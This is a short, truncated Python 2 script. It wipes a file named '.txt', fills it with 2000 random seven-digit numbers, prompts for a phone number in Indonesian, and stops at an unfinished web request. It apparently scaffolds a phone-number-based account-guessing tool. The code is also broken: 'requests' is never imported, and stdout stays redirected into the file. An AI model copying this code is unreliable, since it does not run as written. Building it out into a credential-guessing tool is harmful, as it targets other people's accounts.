#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(2000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()

use = raw_input('\033[1;96m[+] \033[1;96mNO HP \033[1;97m: ')
try:
        a = requests.get(
